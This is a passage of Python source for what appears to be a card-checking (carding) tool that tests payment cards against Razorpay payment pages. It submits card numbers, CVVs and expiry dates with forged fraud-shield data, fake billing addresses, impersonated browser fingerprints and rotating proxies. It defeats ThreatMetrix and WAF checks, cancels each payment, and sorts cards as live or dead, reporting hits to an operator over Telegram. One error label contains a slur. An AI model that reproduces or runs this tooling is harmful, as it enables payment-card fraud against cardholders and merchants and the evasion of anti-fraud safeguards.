            ('_[is_magic_script]', 'false'),
            ('_[os]', self._browser_profile.os_label),
            ('_[referer]', self.payment_referer),
            *RazorpaySession._agent_fields(
                self._ja4_config.impersonate_target
                if self._ja4_config is not None else self._impersonation_target
            ).items(),
            ('_[shield][fhash]', fhash),
            ('_[shield][tz]', shield_tz),
            ('_[device_id]', device_id),
            ('_[build]', self.tokens.get('build_number', '26589118452')),
            ('_[request_index]', '0'),
            ('amount', str(self.tokens.get('order_amount', self.amount_paise))),
            ('order_id', self.tokens.get('order_id', '')),
            ('user_risk_providers_token', risk_token),
            ('method', 'card'),
            ('card[number]', self.card['number']),
            ('card[brand]', self._card_brand()),
            ('card[cvv]', self.card['cvv']),
            ('full_name', self.tokens.get('full_name', '')),
            ('name', self.tokens.get('name', '')),
            ('your_name', self.tokens.get('your_name', '')),
            ('payment_description', self.tokens.get('payment_description', '')),
            ('card[name]', customer_name),
            ('card[expiry_month]', self.card['expiry_month']),
            ('card[expiry_year]', self.card['expiry_year']),
            ('save', '0'),
            # Billing address — uses real Indian pincodes via bharataddress
            *[(f'billing_address[{k}]', v) for k, v in generate_indian_address().items()],
            ('_[shield_context]', self._forged_shield_context()),
        ]

        if include_checkout_id and checkout_id:
            fields.append(('checkout_id', checkout_id))

        # Cross-border fields — appended once, NOT duplicated
        crid = self.tokens.get('currency_request_id', '').strip()
        if crid:
            fields.append(('currency_request_id', crid))
            fields.append(('dcc_currency', self.tokens.get('dcc_currency', self._order_currency())))

        # key_id belongs in the URL query, NOT the body (live HAR never sends it in body)
        fields = [(k, v) for k, v in fields if k != 'key_id']

        return '&'.join(f'{quote(k, safe="~")}={quote(str(v), safe="~")}' for k, v in fields)

    # ── Step 10: 3DS ───────────────────────────────────────────────────────
    def _authenticate_3ds(self):
        payment_id = self.tokens.get('payment_id', '')
        if not payment_id:
            raise RuntimeError('payment_id missing')

        pid_clean = payment_id[4:] if payment_id.startswith('pay_') else payment_id
        auth_url_full = f'{API_BASE}/pg_router/v1/payments/{payment_id}/authenticate'
        auth_url_short = f'{API_BASE}/pg_router/v1/payments/{pid_clean}/authenticate'
        auth_headers = self._pg_router_auth_headers()

        # Empty POST
        try:
            self._request('POST', auth_url_full, auth_headers, data='', raw=True)
        except Exception:
            pass

        time.sleep(0.4)

        # Browser data POST
        browser_data = {
            'browser[java_enabled]': 'false',
            'browser[javascript_enabled]': 'true',
            'browser[timezone_offset]': '0',
            'browser[color_depth]': self.profile.get('color_depth', '24'),
            'browser[screen_width]': self.profile.get('screen_width', '1920'),
            'browser[screen_height]': self.profile.get('screen_height', '1080'),
            'browser[language]': self.profile.get('language', 'en-US'),
            'auth_step': '3ds2Auth',
        }
        bd_qs = '&'.join(f'{quote(k)}={quote(str(v))}' for k, v in browser_data.items())
        resp = self._request('POST', auth_url_short, auth_headers, data=bd_qs, raw=True)
        self.tokens['3ds_auth_response'] = resp.text

    # ── Step 11: Cancel ────────────────────────────────────────────────────
    def _cancel_payment(self):
        payment_id = self.tokens.get('payment_id', '')
        if not payment_id:
            raise RuntimeError('payment_id missing')
        url = (f'{API_BASE}/v1/standard_checkout/payments/{quote(payment_id)}/cancel?'
               f'{self._checkout_auth_query()}')
        resp = self._request('GET', url, self._checkout_api_form_headers(), raw=True)
        self.tokens['cancel_response_raw'] = resp.text
        self.tokens['cancel_http_code'] = resp.status_code

    # ── Outcome ────────────────────────────────────────────────────────────
    def _outcome_from_api_error(self, http_code: int, response: str) -> Optional[dict]:
        # Detect WAF blocks (HTML 403/406) BEFORE JSON parsing.
        if http_code in (403, 406):
            low = response.lower()
            if '<html>' in low or 'forbidden' in low:
                waf_type = 'waf_403' if http_code == 403 else 'waf_406'
                return {'status': 'error',
                        'message': f'WAF {http_code} block — proxy IP flagged by Razorpay',
                        'reason': waf_type}
            if not response or not response.strip():
                return {'status': 'error',
                        'message': f'Site unavailable — HTTP {http_code} (empty response)',
                        'reason': 'site_unavailable'}

        try:
            payload = json.loads(response)
        except json.JSONDecodeError:
            return None

        desc = str(_safe_get(payload, 'error', 'description', default='')).lower()
        reason = str(_safe_get(payload, 'error', 'reason', default=''))
        msg = str(payload.get('message', '')).lower()

        if http_code == 404 and ('no route matched' in msg or 'no route matched' in desc):
            return {'status': 'error', 'message': 'Gay Site', 'reason': 'gay_site'}
        if http_code == 400 and 'payment currency provided does not match' in desc:
            return {'status': 'error', 'message': 'Currency MisMatch', 'reason': 'currency_mismatch'}
        if http_code == 400 and ('invalid fee' in desc):
            return {'status': 'error', 'message': 'Invalid Fee — amount does not match payment link',
                    'reason': 'invalid_fee'}
        if http_code == 400 and ('amount should be equal' in desc or 'min amount' in desc):
            return {'status': 'error', 'message': 'Amount too small', 'reason': 'amount_mismatch'}
        if http_code == 401 and 'please provide your api key' in desc:
            return {'status': 'error', 'message': 'Site Change', 'reason': 'site_change'}
        if http_code == 400 and 'international cards are not supported' in desc:
            return {'status': 'dead', 'message': 'International not support', 'reason': 'international_not_supported'}
        if http_code == 400 and ('your payment didn' in desc or 'declined due to potential risk' in desc):
            return {'status': 'dead', 'message': 'Declined — potential risk (Razorpay fraud check)',
                    'reason': 'rzp_risk_decline'}
        if http_code == 400 and 'temporary block placed on the account' in desc:
            return {'status': 'dead', 'message': 'Merchant Blocked — site unavailable', 'reason': 'merchant_blocked'}
        if http_code == 400 and 'payment page which is not active' in desc:
            return {'status': 'error', 'message': 'Payment Page Inactive', 'reason': 'payment_page_inactive'}
        if http_code == 400 and 'is mandatory payment page item' in desc:
            return {'status': 'error', 'message': 'Mandatory Item', 'reason': 'mandatory_item'}
        if http_code == 400 and 'authentication failed' in desc:
            return {'status': 'dead', 'message': '3DS required — authentication failed',
                    'reason': '3ds_required'}
        if http_code == 400 and 'make live request when not activated' in desc:
            return {'status': 'error', 'message': 'Merchant Not Activated', 'reason': 'merchant_not_activated'}
        if http_code == 400 and 'email field is invalid' in desc:
            return {'status': 'error', 'message': 'Invalid Email', 'reason': 'invalid_email'}
        if http_code == 400 and 'should not be sent' in desc:
            return {'status': 'error', 'message': 'Site Change', 'reason': 'extra_field_sent'}
        if http_code == 400 and 'not enabled for online payments' in desc:
            return {'status': 'dead', 'message': 'Card not enabled for online payments',
                    'reason': 'online_payments_not_enabled'}
        if http_code == 400 and 'card type is not allowed on merchant' in desc:
            return {'status': 'dead', 'message': 'Card type not supported by this merchant',
                    'reason': 'card_type_not_allowed'}
        if http_code == 400 and ('card expiry is invalid' in desc or 'expiry is invalid' in desc):
            return {'status': 'dead', 'message': 'Invalid card expiry date',
                    'reason': 'card_expiry_invalid'}

        # Payment-create specific errors
        if http_code == 400 and reason == 'card_number_invalid':
            return {'status': 'dead', 'message': 'Invalid Card Number', 'reason': 'card_number_invalid'}
        if http_code == 400 and reason == 'card_network_not_enabled':
            return {'status': 'dead', 'message': 'This Type Of Card Is Not Supported By Merchant',
                    'reason': 'card_network_not_enabled'}
        if http_code == 500 and reason == 'server_error':
            return {'status': 'dead', 'message': 'Server Error Change Site', 'reason': 'server_error'}

        # Catch-all for unclassified Razorpay errors
        if 'SERVER_ERROR' in response:
            return {'status': 'dead', 'message': 'Razorpay server error — site issue, not card',
                    'reason': 'rzp_server_error'}
        if http_code == 500 and 'BAD_REQUEST_ERROR' in response:
            return {'status': 'dead', 'message': 'Razorpay server error — site issue, not card',
                    'reason': 'rzp_server_error'}
        if http_code == 400 and 'BAD_REQUEST_ERROR' in response:
            return {'status': 'dead', 'message': f'{desc}' if desc else 'Payment rejected by Razorpay',
                    'reason': 'rzp_bad_request'}

        return None

    def _classify_outcome(self) -> dict:
        cancel_code = int(self.tokens.get('cancel_http_code') or 0)
        cancel_raw = str(self.tokens.get('cancel_response_raw', ''))

        low = cancel_raw.lower()
        try:
            payload = json.loads(cancel_raw)
        except json.JSONDecodeError:
            payload = None

        err = payload.get('error', {}) if isinstance(payload, dict) else {}
        if not isinstance(err, dict):
            err = {}  # guard against error being string/null
        desc = str(err.get('description', '')).replace(
            ' Try another payment method or contact your bank for details.', '').replace(
            'Try another payment method or contact your bank for details.', '')
        reason = str(err.get('reason', ''))
        msg_lower = desc.lower()
        has_payment_id = bool(self.tokens.get('payment_id'))

        # ── PATH 1: EXPLICIT CHARGE INDICATORS ─────────────────────────────
        #   Check A: Payment create response — razorpay_payment_id / razorpay_signature
        #   appear when Razorpay captured the payment during creation (auto-capture).
        #   This matches the PHP reference's primary charge detection.
        create_raw = str(self.tokens.get('create_response_raw', ''))
        if 'razorpay_payment_id' in create_raw or 'razorpay_signature' in create_raw:
            has_pid = 'razorpay_payment_id' in create_raw
            has_sig = 'razorpay_signature' in create_raw
            confidence = 'absolute' if (has_pid and has_sig) else 'detected'
            return {'status': 'charged',
                    'message': f'Payment Successfully — capture {confidence}',
                    'reason': 'charged'}

        #   Check B: Cancel response — Razorpay's cancel endpoint returns
        #   variations like:
        #     "Payment has been captured"
        #     "Payment has already been captured"
        #     "This payment has been captured"
        #   Old rigid substring checks missed "already been captured" because
        #   "already captured" is not a substring (the word "been" separates).
        #   Now uses a flexible single-word match with negative guard.
        if isinstance(payload, dict):
            if str(payload.get('status') or '').lower() in ('captured', 'authorized'):
                return {'status': 'charged', 'message': 'Payment Successfully',
                        'reason': 'charged'}
        # Flexible charge/authorization detection — catches ALL variants:
        #   "Payment has been captured"
        #   "Payment has already been captured"
        #   "Payment has already been authorized"
        #   "Payment was successful" / "Payment is successful"
        # Negative guards prevent false matches on decline messages like
        # "unsuccessful", "not successful", "failed", "not captured".
        # For card checking: both 'authorized' and 'captured' = card is LIVE.
        # Razorpay's API distinction (authorized needs explicit capture) doesn't
        # apply to the hosted payment pages flow — the payment went through.
        charge_keywords = ('captured', 'authorized', 'successful', 'success')
        # Negative guards — catch phrases indicating the payment was NOT
        # successful, like "failed to authorize" or "could not be captured".
        # These prevent false "charged" alerts on failed payments.
        # Does NOT include bare 'failed' — that would match
        # 'payment_cancellation_failed' which Razorpay returns when you try
        # to cancel an already-captured payment.
        negative_guards = ('not captured', 'not authorized', 'unsuccessful',
                          'not successful', 'payment_failed', 'capture_failed',
                          'authentication_failed', 'authorization_failed',
                          'failed to authorize', 'could not be captured',
                          'unable to capture', 'failed to capture',
                          'not completed')
        # IMPORTANT: Only check msg_lower (parsed JSON description), NOT low
        # (raw response body).  WAF 403 HTML pages and proxy error pages can
        # contain "success" in JavaScript, causing false positives.  The
        # razorpay_payment_id/razorpay_signature checks below (line 1289)
        # provide raw-body coverage for legitimate charges.
        is_charged = any(kw in msg_lower for kw in charge_keywords)
        has_negative = any(neg in msg_lower for neg in negative_guards)
        if is_charged and not has_negative:
            return {'status': 'charged', 'message': 'Payment Successfully',
                    'reason': 'charged'}
        if 'razorpay_payment_id' in low or 'razorpay_signature' in low:
            return {'status': 'charged', 'message': 'Payment Successfully',
                    'reason': 'charged'}

        # Handle forced outcomes only if NOT captured (captured check above
        # must take priority over forced outcome — a charge is a charge).
        if self.forced_outcome and not has_payment_id:
            return self.forced_outcome
        if self.forced_outcome and has_payment_id:
            # Preserve 'charged' — Layer 1 detection sets forced_outcome to
            # 'charged' when payment was captured during creation. Don't
            # downgrade it to 'approved' just because cancel wasn't called.
            if self.forced_outcome.get('status') == 'charged':
                return self.forced_outcome
            # Timeout AFTER payment created, BEFORE cancel/3DS completed.
            # If cancel was NEVER attempted (cancel_http=0), we have ZERO
            # evidence of capture — retry with faster proxy instead of false hit.
            if self.forced_outcome.get('reason') == 'timeout_after_payment':
                cancel_code = self.tokens.get('cancel_http_code', 0) or 0
                cancel_raw = self.tokens.get('cancel_response_raw', '')
                cancel_len = len(cancel_raw) if cancel_raw else 0
                if cancel_code == 0:
                    # Cancel never attempted — payment outcome unknown, retry card
                    return {'status': 'error',
                            'message': (
                                f'Payment created ({self.tokens["payment_id"]}) — '
                                f'proxy timed out before cancel | '
                                f'cancel_http={cancel_code} '
                                f'cancel_body={cancel_len}b'
                            ),
                            'reason': 'checkout_incomplete'}
                # Cancel was attempted (HTTP response received) — payment likely real
                return {'status': 'approved',
                        'message': (
                            f'Payment created ({self.tokens["payment_id"]}) — '
                            f'proxy timed out after payment | '
                            f'cancel_http={cancel_code} '
                            f'cancel_body={cancel_len}b'
                        ),
                        'reason': 'payment_created_forced_outcome'}
            # Per-request timeout or other exception — NOT a confirmed outcome.
            # The payment was created but 3DS/cancel didn't complete.
            # Return error so the worker retries with a faster proxy.
            return {'status': 'error',
                    'message': (
                        f'Payment created ({self.tokens["payment_id"]}) but '
                        f'checkout incomplete — {self.forced_outcome.get("reason", "?")}: '
                        f'{self.forced_outcome.get("message", "")[:100]}'
                    ),
                    'reason': 'checkout_incomplete'}

        # ── PATH 2: LIVE LIMIT — card is valid, just can't afford it ──────
        #   "insufficient funds" / "insufficient balance" = card EXISTS, has money,
        #   just not enough.  "maximum transaction limit" = per-txn cap hit.
        #   These are REAL, working cards — hence "approved".
        live_limit_kw = ['insufficient account balance', 'insufficient balance',
                         'insufficient funds', 'low balance',
                         'maximum transaction limit', 'exceeds limit',
                         'exceeds transaction limit']
        for kw in live_limit_kw:
            if kw in msg_lower:
                return {'status': 'approved', 'message': f'{desc} ({reason})'.strip(),
                        'reason': 'live_limit'}

        # ── PATH 4: EXPLICIT DECLINES / FAILURES (return DEAD) ─────────────
        #   These MUST fire before the ambiguous keyword checks below,
        #   otherwise broad substrings cause false "approved" notifications.
        #   ORDER MATTERS: more specific before less specific.

        # CVV incorrect = card valid but CVV wrong — NO charge but card is LIVE.
        # Per r.php reference: returns 'approved' so operator is notified.
        if 'cvv' in msg_lower and ('incorrect' in msg_lower or 'invalid' in msg_lower):
            return {'status': 'approved', 'message': f'CCN Live — {desc} ({reason})'.strip(),
                    'reason': 'ccn'}

        # Card reached 3DS authenticate step — treat as DEAD.
        # Card reached 3DS authenticate step — but only classify as 3DS if the
        # cancel response does NOT contain explicit bank decline keywords.
        # A genuinely declined card (risk_check_failed, do not honour, etc.)
        # will still reach 3DS auth but the bank already rejected it.
        if has_payment_id and self.tokens.get('3ds_auth_response'):
            # Negative guards: explicit bank rejection overrides 3DS classification
            decline_kw = ['declined', 'rejected', 'do not honour', 'not permitted',
                          'restricted card', 'risk_check_failed', 'payment declined',
                          'card_declined', 'not accepted', 'stolen', 'lost card',
                          'pick up', 'expired', 'invalid card', 'incorrect_number']
            has_decline = any(kw in msg_lower for kw in decline_kw)
            has_decline = has_decline or any(kw in reason.lower() for kw in decline_kw)
            if not has_decline:
                return {'status': 'dead',
                        'message': '3DS required — payment not completed',
                        'reason': '3ds_required'}
            # Fall through — card has explicit decline, will be caught by dead_kw below

        # "authentication failed" = bank rejected auth, NO charge → DEAD
        #   Check BEFORE amb_kw which catches bare "authentication" as approved.
        if 'authentication failed' in msg_lower:
            return {'status': 'dead', 'message': f'{desc} ({reason})'.strip()
                    or 'authentication_failed', 'reason': 'auth_failed'}

        # Explicit dead keywords from Razorpay's error descriptions
        dead_kw = ['declined', 'rejected', 'invalid cvv', 'incorrect cvv',
                   'stolen', 'lost card', 'pick up', 'expired',
                   'do not honour', 'not permitted', 'restricted card',
                   'closed account', 'invalid card', 'incorrect_number',
                   'not supported', 'not enabled', 'not accepted',
                   "your payment didn", 'card_declined',
                   'challenge failed', '3ds failed', 'otp failed',
                   'otp verification failed']
        for kw in dead_kw:
            if kw in msg_lower:
                return {'status': 'dead', 'message': f'{desc} ({reason})'.strip()
                        or 'card_declined', 'reason': 'declined'}

        # ── PATH 5: AMBIGUOUS — needs customer action, MAY charge ──────────
        #   "otp", "3ds", "redirect", "challenge" — card needs step-up auth.
        #   "authentication" WITHOUT "failed" = likely 3DS step-up needed.
        #   NOTE: "authentication failed" was already caught as DEAD above.
        #   IMPORTANT: only check msg_lower (parsed JSON error description),
        #   NOT low (raw response body).  Raw HTML error pages from Razorpay/
        #   Cloudflare often contain JavaScript like window.location="redirect"
        #   which would incorrectly match and produce a false "approved" result.
        amb_kw = ['otp', '3ds', 'redirect', 'challenge', 'authentication ',
                  'authentication required', 'authentication needed']
        for kw in amb_kw:
            if kw in msg_lower:
                return {'status': 'approved', 'message': desc or 'needs_customer_step',
                        'reason': '3ds_or_otp'}

        # ── PATH 6: Payment ID in raw response ────────────────────────────
        #   'captured', 'authorized', 'success', 'successful' handled by PATH 1.
        #   Only raw payment IDs should reach here as secondary indicators.
        live_kw = ['"id":"pay_']
        for kw in live_kw:
            if kw in low:
                return {'status': 'approved', 'message': 'approved_or_captured',
                        'reason': 'ok'}

        # ── PATH 7: 5xx / 403 — payment was created but cancel failed ──────
        #   If we have a payment_id, the card MAY have been charged despite
        #   cancel returning an error.  Mark "approved" so the operator is
        #   notified via Telegram — better a false positive than a missed charge.
        #   BUT: GATEWAY_ERROR / gateway_technical_error means the BANK rejected
        #   the payment — it was never captured.  Classify as "dead", not "approved".
        has_payment = bool(self.tokens.get('payment_id'))
        if cancel_code >= 500:
            tg_bot.increment_stat('rzp_5xx')
            if has_payment:
                # Guard: bank gateway errors = payment FAILED, not a charge
                if 'GATEWAY_ERROR' in low or 'gateway_technical_error' in low:
                    tg_bot.increment_stat('gateway_error')
                    return {'status': 'dead',
                            'message': f'gateway_error_not_charged ({self.tokens["payment_id"]})',
                            'reason': 'gateway_technical_error'}
                if 'payment processing failed' in low or 'error at bank' in low:
                    tg_bot.increment_stat('gateway_error')
                    return {'status': 'dead',
                            'message': f'gateway_failure_not_charged ({self.tokens["payment_id"]})',
                            'reason': 'bank_gateway_failure'}
                return {'status': 'approved',
                        'message': f'possible_charge_cancel_5xx ({self.tokens["payment_id"]})',
                        'reason': 'cancel_5xx_payment_created'}
            return {'status': 'error', 'message': desc or 'upstream_5xx',
                    'reason': 'rzp_5xx'}
        if cancel_code == 403 and ('forbidden' in low or '<html>' in low):
            if has_payment:
                return {'status': 'approved',
                        'message': f'possible_charge_cancel_403 ({self.tokens["payment_id"]})',
                        'reason': 'cancel_403_payment_created'}
            return {'status': 'error', 'message': 'payments_ajax_waf_403',
                    'reason': 'ajax_waf_403'}

        # ── PATH 8: Generic error description, no recognized keyword ───────
        if desc:
            return {'status': 'dead', 'message': f'{desc} ({reason})'.strip(),
                    'reason': 'declined_other'}

        # ── PATH 9: Payment created, but cancel returned empty / {} body ───
        #   HTTP 200 + payment_id exists + unrecognizable response = UNCERTAIN.
        #   The card may have been charged silently.  Mark "approved" (not "dead")
        #   so the Telegram notification fires — operator can verify manually.
        if self.tokens.get('payment_id'):
            return {'status': 'approved',
                    'message': f'Payment created ({self.tokens["payment_id"]}) — '
                              f'cancel returned no detail (HTTP {cancel_code})',
                    'reason': 'payment_created_no_cancel_detail'}

        return {'status': 'error', 'message': 'unclassified_response', 'reason': 'unclassified'}

    # ── Async run (for FastAPI / high-concurrency) ─────────────────────────
    async def run_async(self) -> dict:
        """Async version of run() using curl_cffi AsyncSession for non-blocking I/O."""
        if self._async_session is None:
            self._async_session = self._create_async_session()

        t0 = time.time()
        try:
            # Step 1: Payment page
            self._log('\n=== Step 1: Payment page ===')
            html = await self._request_async('GET', self.payment_page_url, self._document_headers())
            self._extract_page_tokens(html)
            await asyncio.sleep(_human_delay(260, 0.5))

            # Step 2: checkout.js
            self._log('\n=== Step 2: checkout.js ===')
            js = await self._request_async('GET', CHECKOUT_JS_URL, self._script_headers())
            self._extract_checkout_js_tokens(js)
            self._generate_ids_async()
            await asyncio.sleep(_human_delay(200, 0.5))

            # Step 3: checkout/public (use cached token if available)
            # Cache key includes proxy host to prevent cross-IP token replay.
            # Without this, 50 concurrent checkouts to the same page from 50
            # different proxies share one cached token — Razorpay flags the
            # token as hijacked and returns HTTP 406.
            self._log('\n=== Step 3: checkout/public ===')
            # get_proxy_host handles all formats reliably — never returns
            # protocol artifacts like 'http' or 'https'.
            proxy_tag = proxy_manager.get_proxy_tag(self.proxy) if self.proxy else 'direct'
            cache_key = f"{self.payment_page_url}|{proxy_tag}"
            cached = None
            if self._session_cache is not None:
                # get_or_wait: if another coroutine is already fetching a token
                # for this proxy+page, wait briefly (1.5s) for it to complete
                # instead of firing a duplicate checkout/public call.  Short
                # timeout prevents herd synchronization on remaining steps.
                cached, waited = await self._session_cache.get_or_wait(cache_key, timeout=1.5)
                if waited:
                    # Add jitter to desynchronize from other waiters
                    jitter_s = random.uniform(0.1, 0.8)
                    await asyncio.sleep(jitter_s)
                    self._log(f'  waited for inflight token fetch '
                              f'(+{jitter_s:.1f}s jitter)')
            if cached is not None:
                self.tokens['session_token'] = cached.session_token
                # Inject cached cookies into async session
                for name, value in cached.cookies.items():
                    self._async_session.cookies.set(name, value, domain='api.razorpay.com', path='/')
                self._log(f'  using cached session_token (age={cached.age_seconds:.0f}s, '
                          f'hits={cached.hit_count}, proxy={proxy_tag})')
            else:
                # Fetch token ourselves — in-flight marker was set by get_or_wait.
                # Wrap in try...finally so the marker is ALWAYS cleared, even if
                # the HTTP request or HTML parsing throws an exception.  Without
                # this, the key stays in _in_flight for 10s and all subsequent
                # checkouts on this proxy block for the full 1.5s timeout.
                fetch_ok = False
                try:
                    pub_html = await self._request_async('GET', self._checkout_public_url(False), self._iframe_headers())
                    self._extract_session_token(pub_html)
                    # Cache the token keyed to this specific proxy — prevents
                    # cross-IP token reuse that triggers Razorpay 406 rejections
                    if self._session_cache is not None and self.tokens.get('session_token'):
                        cookie_jar = dict(self._async_session.cookies.get_dict())
                        self._session_cache.put(
                            cache_key,
                            self.tokens['session_token'],
                            cookie_jar,
                        )
                        self._log(f'  cached session_token for {self._short_url(self.payment_page_url)} '
                                  f'(proxy={proxy_tag})')
                    fetch_ok = True
                finally:
                    if not fetch_ok and self._session_cache is not None:
                        # Fetch failed — clear the in-flight marker so others
                        # don't wait for a token that will never come
                        self._session_cache.put_done(cache_key)

            # Set cookies
            fp_v2 = hashlib.sha256(
                f"{self.tokens.get('rzp_device_id', '')}|{self.profile['user_agent']}".encode()
            ).hexdigest()
            self.tokens['user_fingerprint_v2'] = fp_v2
            self.tokens['client_id'] = str(uuid.uuid4())
            for domain in ['api.razorpay.com', '.razorpay.com']:
                self._async_session.cookies.set('user_fingerprint_v2', fp_v2, domain=domain, path='/')
                self._async_session.cookies.set('testcookie', '1', domain=domain, path='/')
                self._async_session.cookies.set('clientId', self.tokens['client_id'], domain=domain, path='/')
            await asyncio.sleep(_human_delay(320, 0.5))

            # Step 4: Create order
            self._log('\n=== Step 4: Create order ===')
            await self._create_order_async()
            await asyncio.sleep(_human_delay(240, 0.5))

            # TM warm-up (opt-in via config.json TM_WARM_ENABLED=1): run the
            # ThreatMetrix fingerprint in a stealth browser from the SAME proxy,
            # in a background thread, so steps 5-8 proceed in parallel.
            self._warm_thread = None
            if tm_warm_enabled():
                cid = self.tokens.get('checkout_id', '')
                if cid:
                    try:
                        from browser_warm import warm_threatmetrix_sync
                        self._warm_thread = threading.Thread(
                            target=warm_threatmetrix_sync,
                            args=(cid, self.proxy),
                            daemon=True,
                        )
                        self._warm_thread.start()
                        self._log('  TM warm-up started (background)')
                    except Exception as _warm_err:
                        self._log(f'  TM warm-up skipped: {_warm_err}')

            # Step 5: Prefill encrypt
            if not self.forced_outcome:
                self._log('\n=== Step 5: Prefill encrypt ===')
                await self._encrypt_prefill_async()
                await asyncio.sleep(_human_delay(240, 0.5))

            # Step 6: Preferences
            if not self.forced_outcome:
                self._log('\n=== Step 6: Preferences ===')
                await self._fetch_preferences_async()
                await asyncio.sleep(_human_delay(240, 0.5))

            # Step 7: IIN lookup
            if not self.forced_outcome:
                self._log('\n=== Step 7: IIN lookup ===')
                await self._lookup_iin_async()
                await asyncio.sleep(_human_delay(200, 0.5))

            # Step 8: cb_flows
            if not self.forced_outcome:
                self._log('\n=== Step 8: cb_flows ===')
                await self._fetch_cb_flows_async()
                await asyncio.sleep(_human_delay(200, 0.5))

            # Step 9: Create payment (light pause for mass concurrency)
            if not self.forced_outcome:
                if getattr(self, '_warm_thread', None) and self._warm_thread.is_alive():
                    self._warm_thread.join(timeout=6)  # let TM beacons land first
                self._log('\n=== Step 9: Create payment ===')
                self._fire_lumberjack_sequence()  # Human signals — prevent WAF
                await asyncio.sleep(_human_delay(240, 0.4))  # Reduced from 2000ms
                await self._create_payment_async()

            # Step 10: 3DS
            if not self.forced_outcome:
                self._log('\n=== Step 10: 3DS authenticate ===')
                await self._authenticate_3ds_async()
                await asyncio.sleep(_human_delay(380, 0.5))

                # Step 11: Cancel
                self._log('\n=== Step 11: Cancel payment ===')
                await self._cancel_payment_async()

        except Exception as e:
            err_str = str(e)
            if '|' in err_str and err_str.count('|') >= 2:
                parts = err_str.split('|', 2)
                self.forced_outcome = self.forced_outcome or {
                    'status': parts[0], 'reason': parts[1], 'message': parts[2][:500]}
            else:
                self.forced_outcome = self.forced_outcome or {
                    'status': 'error', 'message': err_str[:500], 'reason': 'exception'}
            self._log(f'RUN ERROR: {e}')

        return self._build_result(time.time() - t0)

    def _generate_ids_async(self):
        """Generate IDs using the async session for cookie setting."""
        cid = generate_checkout_id()
        self.tokens['checkout_id'] = cid
        self.tokens['unified_session_id'] = cid
        self.tokens['rzp_device_id'] = self._browser_profile.generate_device_id()
        payment_host = self._host()
        self._async_session.cookies.set('rzp_unified_session_id', cid, domain=payment_host, path='/')

    # ── Async step wrappers (delegate to sync logic, await HTTP calls) ─────

    async def _create_order_async(self):
        """Async wrapper: same logic, async HTTP.

        Uses the page_auth_mode detected in _extract_page_tokens() to make
        exactly one targeted request instead of brute-forcing auth sequences.
        Falls back to auth looping only if the targeted request returns an
        authentication error."""
        pl_id = self.tokens.get('payment_link_id', '')
        if not pl_id:
            self.forced_outcome = {'status': 'error', 'message': 'Gay Site', 'reason': 'gay_site'}
            return

        line_items = self.tokens.get('order_line_items') or [
            {'payment_page_item_id': self.tokens.get('ppi_id', ''), 'amount': self.amount_paise}]

        # Build targeted auth based on detected page mode (not brute-force).
        # CRITICAL: razorpay.me pages must use EMPTY auth for order creation.
        # r.php's orderAuthSequence() returns [[]] for isRazorpayMePage() —
        # sending keyless_header as a query param on razorpay.me order endpoint
        # causes Razorpay to reject with "Something went wrong" (400).
        auth_mode = self.tokens.get('page_auth_mode', 'open')
        auth: dict = {}
        if self._is_razorpay_me():
            auth = {}  # razorpay.me → no query params on order endpoint
        elif auth_mode == 'key':
            auth = {'key_id': True}
        elif auth_mode == 'keyless':
            auth = {'keyless_header': True}
        # open mode → empty auth (default)

        # Fallback sequences if targeted auth fails with authentication error
        if self._is_razorpay_me():
            fallback_auths: list[dict] = []
        elif auth_mode == 'open':
            fallback_auths = [{'keyless_header': True}, {'key_id': True},
                              {'keyless_header': True, 'key_id': True}]
        elif auth_mode == 'keyless':
            fallback_auths = [{'key_id': True}, {'keyless_header': True, 'key_id': True}]
        else:
            fallback_auths = [{'keyless_header': True}, {'keyless_header': True, 'key_id': True}]

        body = ''
        http_code = 500

        for auth in [auth] + fallback_auths:
            url = self._payment_page_order_url(pl_id, auth)
            payload = {'notes': {'email': self.tokens.get('email', ''), 'phone': self.tokens.get('contact', ''), 'phone_imei_no': self.tokens.get('phone_imei_no', ''), 'description': self.tokens.get('description', '')}, 'line_items': line_items}
            try:
                resp = await self._request_async('POST', url, self._payment_page_api_headers(auth),
                                                 json_data=payload, raw=True)
                body = resp.text
                http_code = resp.status_code
                if http_code < 400:
                    break
                ppi_required = re.search(r'(ppi_[A-Za-z0-9]+)\s+is mandatory payment page item', body, re.I)
                if not ppi_required:
                    ppi_required = re.search(r'payment_page_item_id.*?(ppi_[A-Za-z0-9]+)', body, re.I)
                if not ppi_required:
                    ppi_required = re.search(r'"id"\s*:\s*"(ppi_[A-Za-z0-9]+)"', body, re.I)
                if ppi_required and http_code >= 400:
                    mandatory_ppi = ppi_required.group(1)
                    new_items = [{'payment_page_item_id': mandatory_ppi, 'amount': self.amount_paise}]
                    resp2 = await self._request_async('POST', url, self._payment_page_api_headers(auth),
                                                       json_data={'notes': {'email': self.tokens.get('email', ''), 'phone': self.tokens.get('contact', ''), 'phone_imei_no': self.tokens.get('phone_imei_no', ''), 'description': self.tokens.get('description', '')},
                                                                  'line_items': new_items}, raw=True)
                    body = resp2.text
                    http_code = resp2.status_code
                    if http_code < 400:
                        line_items = new_items
                        break
                low = body.lower()
                if not ('authentication failed' in low or 'please provide your api key' in low
                        or 'should not be sent' in low):
                    break
            except RuntimeError as e:
                err_str = str(e)
                m = re.match(r'HTTP (\d+) ', err_str)
                if m:
                    http_code = int(m.group(1))
                    body = err_str
                # Only continue to fallback on auth errors; 403/5xx break immediately
                if http_code not in (401, 400):
                    break

        if http_code >= 400:
            self.forced_outcome = self._outcome_from_api_error(http_code, body)
            if not self.forced_outcome:
                # Unmapped error — default to 'dead' instead of crashing
                self.forced_outcome = {
                    'status': 'dead',
                    'message': f'Order failed (HTTP {http_code}): {body[:200]}',
                    'reason': 'order_failed',
                }
            return

        data = json.loads(body)
        self.tokens['order_id'] = data['order']['id']
        self.tokens['line_item_id'] = data['line_items'][0]['id']
        self.tokens['order_amount'] = str(data['order'].get('amount', self.amount_paise))
        oc = data['order'].get('currency', '')
        if oc:
            self.tokens['currency'] = oc.upper()

    async def _encrypt_prefill_async(self):
        self._ensure_customer_details()
        try:
            url = f'{API_BASE}/v1/standard_checkout/checkout/prefill/encrypt?{self._checkout_auth_query()}'
            resp = await self._request_async('POST', url, self._checkout_api_json_headers(True),
                                             json_data={'contact': self.tokens['contact'],
                                                        'email': self.tokens['email']})
            data = json.loads(resp)
            prefill = data.get('prefill_data_v1', '')
            if prefill:
                self.tokens['prefill_data_v1'] = prefill
                for domain in ['api.razorpay.com', '.razorpay.com']:
                    self._async_session.cookies.set('prefill_data_v1', prefill, domain=domain, path='/')
        except Exception as e:
            self._log(f'  prefill skip: {e}')

    async def _fetch_preferences_async(self):
        try:
